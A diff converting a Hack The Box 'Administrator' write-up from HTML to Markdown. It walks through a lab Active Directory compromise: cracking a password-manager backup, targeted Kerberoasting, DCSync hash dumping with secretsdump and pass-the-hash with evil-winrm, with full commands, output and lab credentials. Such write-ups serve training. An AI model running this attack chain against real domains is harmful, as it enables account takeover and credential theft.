 Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError
-
+                                        
 Error: Exiting with code 1
-</code></pre>
-<p>Maybe smb?</p>
-<pre><code>┌──(oriol㉿zero)-[~/htb/administrator]
+```
+
+Maybe smb?
+```
+┌──(oriol㉿zero)-[~/htb/administrator]
 └─$ smbclient -L administrator.htb -U benjamin%zero123        
 
         Sharename       Type      Comment
@@ -667,20 +651,22 @@ Error: Exiting with code 1
 Reconnecting with SMB1 for workgroup listing.
 do_connect: Connection to administrator.htb failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
 Unable to connect with SMB1 -- no workgroup available
-
+                                                                                                                                                                                                                                            
 ┌──(oriol㉿zero)-[~/htb/administrator]
 └─$ smbclient \\\\administrator.htb\\NETLOGON -U benjamin%zero123
-Try &quot;help&quot; to get a list of possible commands.
-smb: \&gt; ls
-    .                                   D        0  Fri Oct  4 21:48:08 2024
-    ..                                  D        0  Fri Oct  4 21:54:15 2024
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                   D        0  Fri Oct  4 21:48:08 2024
+  ..                                  D        0  Fri Oct  4 21:54:15 2024
 
                 5606911 blocks of size 4096. 2009697 blocks available
-smb: \&gt; 
-</code></pre>
-<p>I don't see nothing on the smb...
-Maybe on the ftp?</p>
-<pre><code>┌──(oriol㉿zero)-[~/htb/administrator]
+smb: \> 
+```
+
+I don't see nothing on the smb...
+Maybe on the ftp?
+```
+┌──(oriol㉿zero)-[~/htb/administrator]
 └─$ ftp administrator.htb                                            
 Connected to administrator.htb.
 220 Microsoft FTP Service
@@ -689,23 +675,23 @@ Name (administrator.htb:oriol): benjamin
 Password: 
 230 User logged in.
 Remote system type is Windows_NT.
-ftp&gt; ls
+ftp> ls
 229 Entering Extended Passive Mode (|||61289|)
 125 Data connection already open; Transfer starting.
 10-05-24  09:13AM                  952 Backup.psafe3
 226 Transfer complete.
-ftp&gt; 
-</code></pre>
-<p>Yes! Seems that there is like a dump of a password manager?
-Searching a little bit, this file is from the <strong>pwsafe</strong> software</p>
-<p>
-    <ul><li>https://pwsafe.org/</li></ul>
-</p>
-<p>We need a master password. I find this hashcat thread with the necessary information to crack the password.
-<p>
-    <ul><li>https://hashcat.net/forum/thread-3883.html</li></ul>
-</p>
-<pre><code>┌──(oriol㉿zero)-[~/htb/administrator]
+ftp> 
+```
+
+Yes! Seems that there is like a dump of a password manager?
+Searching a little bit, this file is from the **pwsafe** software
+- https://pwsafe.org/
+
+We need a master password. I find this hashcat thread with the necessary information to crack the password.
+- https://hashcat.net/forum/thread-3883.html
+
+```
+┌──(oriol㉿zero)-[~/htb/administrator]
 └─$ hashcat -m 5200 Backup.psafe3  /usr/share/wordlists/rockyou.txt.gz 
 
 hashcat (v6.2.6) starting
@@ -742,7 +728,7 @@ Dictionary cache hit:
 * Keyspace..: 14344385
 
 Backup.psafe3:tekieromucho                                
-
+                                                          
 Session..........: hashcat
 Status...........: Cracked
 Hash.Mode........: 5200 (Password Safe v3)
@@ -759,31 +745,35 @@ Rejected.........: 0/12288 (0.00%)
 Restore.Point....: 0/14344385 (0.00%)
 Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:2048-2049
 Candidate.Engine.: Device Generator
-Candidates.#1....: 123456 -&gt; hawkeye
+Candidates.#1....: 123456 -> hawkeye
 Hardware.Mon.#1..: Util:  9%
 
 Started: Sun Apr  6 20:13:34 2025
 Stopped: Sun Apr  6 20:13:45 2025
-</code></pre>
-<p><strong>Password:</strong> tekieromucho</p>
-<p>Now, I can access to the password manager, and I see that there are 3 users:
-- <strong>alexander:</strong> UrkIbagoxMyUGw0aPlj9B0AXSea4Sw
-- <strong>emily:</strong> UXLCI5iETUsIBoFVTj8yQFKoHjXmb
-- <strong>emma:</strong> WwANQWnmJnGV07WQN8bMS7FMAbjNur</p>
-<p>I try and access with the emily user:</p>
-<pre><code>┌──(oriol㉿zero)-[~/htb/administrator]
+```
+
+**Password:** tekieromucho
+
+Now, I can access to the password manager, and I see that there are 3 users:
+- **alexander:** UrkIbagoxMyUGw0aPlj9B0AXSea4Sw
+- **emily:** UXLCI5iETUsIBoFVTj8yQFKoHjXmb
+- **emma:** WwANQWnmJnGV07WQN8bMS7FMAbjNur
+
+I try and access with the emily user:
+```
+┌──(oriol㉿zero)-[~/htb/administrator]
 └─$ evil-winrm -i administrator.htb -u emily -p UXLCI5iETUsIBoFVTj8yQFKoHjXmb
-
+                                        
 Evil-WinRM shell v3.7
-
+                                        
 Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
-
+                                        
 Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
-
+                                        
 Info: Establishing connection to remote endpoint
-*Evil-WinRM* PS C:\Users\emily\Documents&gt; ls
-*Evil-WinRM* PS C:\Users\emily\Documents&gt; cd ..
-*Evil-WinRM* PS C:\Users\emily&gt; ls
+*Evil-WinRM* PS C:\Users\emily\Documents> ls
+*Evil-WinRM* PS C:\Users\emily\Documents> cd ..
+*Evil-WinRM* PS C:\Users\emily> ls
 
 
     Directory: C:\Users\emily
@@ -805,11 +795,13 @@ d-r---        10/30/2024   2:23 PM                Searches
 d-r---        10/30/2024   2:23 PM                Videos
 
 
-*Evil-WinRM* PS C:\Users\emily&gt; cd Desktop
-*Evil-WinRM* PS C:\Users\emily\Desktop&gt; type user.txt
-</code></pre>
-<h3 id="privesc">Privilege escalation</h3>
-<pre><code>*Evil-WinRM* PS C:\Users\emily\Desktop&gt; whoami /all
+*Evil-WinRM* PS C:\Users\emily> cd Desktop
+*Evil-WinRM* PS C:\Users\emily\Desktop> type user.txt
+```
+
+### Privilege escalation
+```
+*Evil-WinRM* PS C:\Users\emily\Desktop> whoami /all
 
 USER INFORMATION
 ----------------
@@ -851,33 +843,36 @@ USER CLAIMS INFORMATION
 User claims unknown.
 
 Kerberos support for Dynamic Access Control on this device has been disabled
-</code></pre>
-<p>I don't see any privileges that could help escalate.</p>
-<p>Returning to Bloodhound, I see that Emily has <code>GenericWrite</code> privileges on the user Ethan.
-<p><img src="src/administrator03.png"></p>
-<p>And I also see that Ethan has <code>DCSync</code> privileges on the whole AD.</p>
-<p><img src="src/administrator04.png"></p>
-<p>DCSync is a feature used to replicate changes between DC. We need the <code>DS-Replication-Get-Changes</code> and the <code>DS-Replication-Get-Changes-All</code> permissions, which Ethan has. With those privileges, we can request sensitive information like password hashes.</p>
-<p>I think it's pretty clear what I have to do.</p>
-<p>I will do a <strong>kerberoast</strong> attack on the user Ethan. First, let's learn how the attack works:
-First a <strong>SPN</strong> or Service Principal Name is an unique name assigned to a service instance and assigned to an account.</p>
-<p>
-    <ul>
-        <li>I create a SPN with the Ethan account, with the <code>GenericWrite</code> permissions. Now Ethan is like a "service", meaning we can request a TGS (Ticket Granting Service) ticket with the Ethan user.</li>
-        <li>We query the AD for Ethan's SPN, and if it exists, we also request a TGS (Ticket Granting Service) for the Ethan service</li>
-        <li>That TGS is encrypted with Ethan's password hash.</li>
-        <li>We have the Ethan  password hash!</li>
-    </ul>
+```
 
-</p>
-<p>I will use <code>targetedKerberoast.py</code> , which automates all this process, to do the attack.
-Not before syncing my local machine time with the DC.</p>
-<pre><code>┌──(oriol㉿zero)-[~/htb/administrator/targetedKerberoast]
+I don't see any privileges that could help escalate.
+
+Returning to Bloodhound, I see that Emily has `GenericWrite` privileges on the user Ethan.
+![[administrator03.png]]
+
+And I also see that Ethan has `DCSync` privileges on the whole AD.
+![[administrator04.png]]
+
+DCSync is a feature used to replicate changes between DC. We need the `DS-Replication-Get-Changes` and the `DS-Replication-Get-Changes-All` permissions, which Ethan has. With those privileges, we can request sensitive information like password hashes.
+
+I think it's pretty clear what I have to do.
+
+I will do a **kerberoast** attack on the user Ethan. First, let's learn how the attack works:
+First a **SPN** or Service Principal Name is an unique name assigned to a service instance and assigned to an account. 
+- I create a SPN with the Ethan account, with the `GenericWrite` permissions. Now Ethan is like a "service", meaning we can request a TGS (Ticket Granting Service) ticket with the Ethan user.
+- We query the AD for Ethan's SPN, and if it exists, we also request a TGS (Ticket Granting Service) for the Ethan service
+- That TGS is encrypted with Ethan's password hash.
+- We have the Ethan  password hash!
+
+I will use `targetedKerberoast.py` , which automates all this process, to do the attack.
+Not before syncing my local machine time with the DC.
+```
+┌──(oriol㉿zero)-[~/htb/administrator/targetedKerberoast]
 └─$ sudo ntpdate administrator.htb
 [sudo] password for oriol: 
 2025-04-07 05:06:18.503817 (+0200) +25202.238424 +/- 0.021050 administrator.htb 10.10.11.42 s1 no-leap
 CLOCK: time stepped by 25202.238424
-
+                                                                                                                                                                                                                                            
 ┌──(oriol㉿zero)-[~/htb/administrator/targetedKerberoast]
 └─$ python3 targetedKerberoast.py -v -d 'administrator.htb' -u 'emily' -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb' --dc-ip 10.10.11.42
 [*] Starting kerberoast attacks
@@ -886,9 +881,11 @@ CLOCK: time stepped by 25202.238424
 [+] Printing hash for (ethan)
 $krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator.htb/ethan*$b5c2d39c9b152d39931f19ccfcb156a1$a9ae9078580a20e7207cb51308586a2f0aa233a88b83f5c243768ac66461e6c657266dd0e1f7eda397da921af0cf51dcc954f3bbfbba028e407c5ee6321072a08925a69cb4e3555cefcebd12c26e82718cccc30ec8ad3b0313c7bc56601c6340156e8d191248304583e802fba1f9d158a13768fdeac9e1f0982a42f7e386331678140656712e7cfa6743c247b4c26267846f588e4c03069f62076197c3337fade567a9b6b6db51296d9fc41e459e2b2cd6fb50a4ed79a9a56ba694f08ca62f6a5c46b99c8f397c7566cf5ea3cc41cad82b0a9cb2e7fa999ea22a099059656f84271bd2f1472194af3392813c0b9f6ff0a92094b2beb8e4175b30ce6b52b26b68e03aed8354460e9d11d8ffdd649e345dc360e63759152c6f3f6f5cb5d555930058769e9998549af41e0c27b5bb4b02ad192786ef00d71df5d033f11fae66e79714e32f0faf0accb201a58c7fc150c7674edbd7b3fba75ee3d683df6dfe62d9f257646cca157ed1a3b8b7f76b96490dae90990f8e58e6c5a3ede720b479d23fde67d0d3a144338f26ee1cbb38cbdef05fb57733c52b4f83b4cdf490c2f8b37d25a8e53bc01a92f353d91da9f1f670a9e48ca2076d056e58d7d99688132d3eb2e9ae312f169a19320c28772098e6df6332290f55a1c7c11684c273517f14bb801e38b46a0ffc1a1c82403711be65fbc2a58a8a75a154e6f13ef7b386ac083dfd73e0bdff68df193064a74afde09f51bcb1abeb94bfb93c1b66e227aae80cc0b055027e4d6feb93aa5d41df2a395ca8284bef8db96bfd6da9899e8bcc3871002ca5e4ec5c55b993ca8c6cf446e5eb019249c8a5c7371a0e818b73592e23e06921bc4ca7f553481f9d246e6da3f44ce722ea9092eac894eca234ac019347dfd063aae61357516738e65b328060ca9ec8f273f063f1b8a7241678fa7e5b76e36c6531401e767bbc6016d92438b2f91bcaa79d762d84c743ca61c647314b44e980366b46685fbb91883aa079846200a6c449cde5b3f07ae660061ac10eb0444289ccdfb5e915dc7c09f493450e0a707f379fc2a82c671aac953347033b015f5f745fb7125e69b81c31f3cebe8659142623609dd768d0529083a544d10ba07dcd51161f48ddad4453afa6ec09bd3a69b4f2abd273edc17b8ed04b83a6f60dd21689680d476ce9ab3e4fe3120fe24baf489b5270d6f69c87e17206289e1099e3d481fd0066f3842d2fad6522318bb7e3aecd6724950a79dbdcbdaf8e19887080a7ed906a40821ad29c9967612dddf599ab6cdfea4756cd39199829c6442220c7d50b68bc001b1aea36af9e138ea3a2832e08465f76d7962cd1730094b83e71af0d6114cf3f4b9c70a762d515cc3ae11fc5e829359a6352aa148d583981077364e34d7ca37e94ae3b890bbe266ca827672d08b49cd20c92ffc592da63277796c21b1817117a64ffd0c9e293669cd604b534f2353ac55ffb5acd3ef93b10a8a23f5b3c55d49f60c5d7a0d1b9ddb0be45d9d65790b95abacd7fe145bfc6cb2c2b596ffc57
 [VERBOSE] SPN removed successfully for (ethan)
-</code></pre>
-<p>Now it's time to crack the hash with <code>hashcat</code></p>
-<pre><code>┌──(oriol㉿zero)-[~/htb/administrator]
+```
+
+Now it's time to crack the hash with `hashcat`
+```
+┌──(oriol㉿zero)-[~/htb/administrator]
 └─$ hashcat -m 13100 ethan_hash.txt /usr/share/wordlists/rockyou.txt.gz 
 hashcat (v6.2.6) starting
 
@@ -925,7 +922,7 @@ Dictionary cache hit:
 * Keyspace..: 14344385
 
 $krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator.htb/ethan*$b5c2d39c9b152d39931f19ccfcb156a1$a9ae9078580a20e7207cb51308586a2f0aa233a88b83f5c243768ac66461e6c657266dd0e1f7eda397da921af0cf51dcc954f3bbfbba028e407c5ee6321072a08925a69cb4e3555cefcebd12c26e82718cccc30ec8ad3b0313c7bc56601c6340156e8d191248304583e802fba1f9d158a13768fdeac9e1f0982a42f7e386331678140656712e7cfa6743c247b4c26267846f588e4c03069f62076197c3337fade567a9b6b6db51296d9fc41e459e2b2cd6fb50a4ed79a9a56ba694f08ca62f6a5c46b99c8f397c7566cf5ea3cc41cad82b0a9cb2e7fa999ea22a099059656f84271bd2f1472194af3392813c0b9f6ff0a92094b2beb8e4175b30ce6b52b26b68e03aed8354460e9d11d8ffdd649e345dc360e63759152c6f3f6f5cb5d555930058769e9998549af41e0c27b5bb4b02ad192786ef00d71df5d033f11fae66e79714e32f0faf0accb201a58c7fc150c7674edbd7b3fba75ee3d683df6dfe62d9f257646cca157ed1a3b8b7f76b96490dae90990f8e58e6c5a3ede720b479d23fde67d0d3a144338f26ee1cbb38cbdef05fb57733c52b4f83b4cdf490c2f8b37d25a8e53bc01a92f353d91da9f1f670a9e48ca2076d056e58d7d99688132d3eb2e9ae312f169a19320c28772098e6df6332290f55a1c7c11684c273517f14bb801e38b46a0ffc1a1c82403711be65fbc2a58a8a75a154e6f13ef7b386ac083dfd73e0bdff68df193064a74afde09f51bcb1abeb94bfb93c1b66e227aae80cc0b055027e4d6feb93aa5d41df2a395ca8284bef8db96bfd6da9899e8bcc3871002ca5e4ec5c55b993ca8c6cf446e5eb019249c8a5c7371a0e818b73592e23e06921bc4ca7f553481f9d246e6da3f44ce722ea9092eac894eca234ac019347dfd063aae61357516738e65b328060ca9ec8f273f063f1b8a7241678fa7e5b76e36c6531401e767bbc6016d92438b2f91bcaa79d762d84c743ca61c647314b44e980366b46685fbb91883aa079846200a6c449cde5b3f07ae660061ac10eb0444289ccdfb5e915dc7c09f493450e0a707f379fc2a82c671aac953347033b015f5f745fb7125e69b81c31f3cebe8659142623609dd768d0529083a544d10ba07dcd51161f48ddad4453afa6ec09bd3a69b4f2abd273edc17b8ed04b83a6f60dd21689680d476ce9ab3e4fe3120fe24baf489b5270d6f69c87e17206289e1099e3d481fd0066f3842d2fad6522318bb7e3aecd6724950a79dbdcbdaf8e19887080a7ed906a40821ad29c9967612dddf599ab6cdfea4756cd39199829c6442220c7d50b68bc001b1aea36af9e138ea3a2832e08465f76d7962cd1730094b83e71af0d6114cf3f4b9c70a762d515cc3ae11fc5e829359a6352aa148d583981077364e34d7ca37e94ae3b890bbe266ca827672d08b49cd20c92ffc592da63277796c21b1817117a64ffd0c9e293669cd604b534f2353ac55ffb5acd3ef93b10a8a23f5b3c55d49f60c5d7a0d1b9ddb0be45d9d65790b95abacd7fe145bfc6cb2c2b596ffc57:limpbizkit
-
+                                                          
 Session..........: hashcat
 Status...........: Cracked
 Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
@@ -942,17 +939,20 @@ Rejected.........: 0/12288 (0.00%)
 Restore.Point....: 0/14344385 (0.00%)
 Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
 Candidate.Engine.: Device Generator
-Candidates.#1....: 123456 -&gt; hawkeye
+Candidates.#1....: 123456 -> hawkeye
 Hardware.Mon.#1..: Util:  8%
 
 Started: Sun Apr  6 22:12:29 2025
 Stopped: Sun Apr  6 22:12:40 2025
-</code></pre>
-<p>Password found: <strong>limpbizkit</strong>
+```
+
+Password found: **limpbizkit**
 I searched for the RC4 hash to know which type use on hashcat.
-- https://activedirectory.mrw0l05zyn.cl/escalamiento-de-privilegios-de-dominio/kerberoast</p>
-<p>And now, it's time to abuse the DCSync, I wil be using <code>secretsdump.py</code> which automates the requests of the users hashes.</p>
-<pre><code>┌──(oriol㉿zero)-[~/htb/administrator]
+- https://activedirectory.mrw0l05zyn.cl/escalamiento-de-privilegios-de-dominio/kerberoast
+
+And now, it's time to abuse the DCSync, I wil be using `secretsdump.py` which automates the requests of the users hashes.
+```
+┌──(oriol㉿zero)-[~/htb/administrator]
 └─$ impacket-secretsdump 'administrator.htb'/'ethan':'limpbizkit'@'DC.ADMINISTRATOR.HTB'
 Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
 
@@ -1002,42 +1002,39 @@ DC$:aes256-cts-hmac-sha1-96:98ef91c128122134296e67e713b233697cd313ae864b1f26ac1b
 DC$:aes128-cts-hmac-sha1-96:7068a4761df2f6c760ad9018c8bd206d
 DC$:des-cbc-md5:f483547c4325492a
 [*] Cleaning up...
-</code></pre>
-<p>And we got the Administrator hash, now it's only question to use evil-winrm with pass-the-hash option enabled to remote to the computer and get the root flag.</p>
-<pre><code>┌──(oriol㉿zero)-[~/htb/administrator]
+```
+
+And we got the Administrator hash, now it's only question to use evil-winrm with pass-the-hash option enabled to remote to the computer and get the root flag.
+```
+┌──(oriol㉿zero)-[~/htb/administrator]
 └─$ evil-winrm -i administrator.htb -u administrator -H 3dc553ce4b9fd20bd016e098d2d2fd2e 
-
+                                        
 Evil-WinRM shell v3.7
-
+                                        
 Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
-
+                                        
 Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
-
+                                        
 Info: Establishing connection to remote endpoint
-*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; whoami
+*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
 administrator\administrator
-</code></pre>
-<h1 id="solutions">Solutions</h1>
-<ul>
-<li>Remove all unnecessary user privileges, why are so many users with privileges over other users? And also Ethan with DCSync privileges?</li>
-<li>Use more long and secure passwords.</li>
-</ul>
-<h1 id="links">Links used</h1>
-<ul>
-<li>https://learn.microsoft.com/en-us/previous-versions/windows/desktop/policy/group-policy-start-page</li>
-<li>https://docs.tenable.com/identity-exposure/SaaS/Content/User/AttackPath/DCSync.htm</li>
-<li>https://www.semperis.com/es/blog/dcsync-attack/</li>
-<li>https://www.tarlogic.com/es/glosario-ciberseguridad/kerberoasting/</li>
-<li>https://serverfault.com/questions/707866/list-all-kerberized-spns-in-linux</li>
-<li>https://www.ultimatewindowssecurity.com/wiki/page.aspx?spid=AllowLogOnLocally</li>
-<li>https://takraw-s.medium.com/fix-errors-socket-ssl-wrapping-error-errno-104-connection-reset-by-peer-9c63c551cd7</li>
-<li>https://github.com/ShutdownRepo/targetedKerberoast</li>
-<li>https://activedirectory.mrw0l05zyn.cl/escalamiento-de-privilegios-de-dominio/kerberoast</li>
-<li>https://www.secura.com/blog/kerberoasting-exploiting-kerberos-to-compromise-microsoft-active-directory</li>
-<li>https://hashcat.net</li>
-<li>https://pwsafe.org/</li>
-<li>https://learn.microsoft.com/es-es/sql/reporting-services/report-server/register-a-service-principal-name-spn-for-a-report-server?view=sql-server-ver16</li>
-</ul>  
-</div>
-</body>
-</html>
+```
+
+# Solutions
+- Remove all unnecessary user privileges, why are so many users with privileges over other users? And also Ethan with DCSync privileges?
+- Use more long and secure passwords.
+
+# Links used
+- https://learn.microsoft.com/en-us/previous-versions/windows/desktop/policy/group-policy-start-page
+- https://docs.tenable.com/identity-exposure/SaaS/Content/User/AttackPath/DCSync.htm
+- https://www.semperis.com/es/blog/dcsync-attack/
+- https://www.tarlogic.com/es/glosario-ciberseguridad/kerberoasting/
+- https://serverfault.com/questions/707866/list-all-kerberized-spns-in-linux
+- https://www.ultimatewindowssecurity.com/wiki/page.aspx?spid=AllowLogOnLocally
+- https://takraw-s.medium.com/fix-errors-socket-ssl-wrapping-error-errno-104-connection-reset-by-peer-9c63c551cd7
+- https://github.com/ShutdownRepo/targetedKerberoast
+- https://activedirectory.mrw0l05zyn.cl/escalamiento-de-privilegios-de-dominio/kerberoast
+- https://www.secura.com/blog/kerberoasting-exploiting-kerberos-to-compromise-microsoft-active-directory
+- https://hashcat.net
+- https://pwsafe.org/
+- https://learn.microsoft.com/es-es/sql/reporting-services/report-server/register-a-service-principal-name-spn-for-a-report-server?view=sql-server-ver16
